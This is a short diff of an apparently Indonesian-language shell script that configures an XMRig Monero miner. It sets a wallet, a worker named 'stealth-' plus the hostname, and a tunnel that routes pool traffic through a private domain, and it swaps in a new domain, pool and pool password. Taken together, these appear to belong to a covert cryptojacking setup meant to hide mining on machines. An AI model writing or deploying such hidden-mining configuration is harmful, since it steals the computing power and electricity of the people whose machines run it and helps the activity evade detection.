@@ -3,8 +3,8 @@ set -e
 
 # === KONFIGURASI YANG HARUS DIEDIT OLEH USER ===
 WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
-DOMAIN="miner.domainmu.com"        # Ganti dengan domain milikmu
-POOL_TARGET="pool.supportxmr.com:443"
+DOMAIN="vheler.cfd"
+POOL_TARGET="pool.hashvault.pro:443"
 TUNNEL_NAME="xmrig-tunnel"
 WORKER="stealth-$(hostname 2>/dev/null || echo $RANDOM)"
 
@@ -65,7 +65,7 @@ cat > config.json <<EOF
   "pools": [{
     "url": "$DOMAIN:443",
     "user": "$WALLET.$WORKER",
-    "pass": "x",
+    "pass": "Genzo",
     "tls": true
   }]
 }
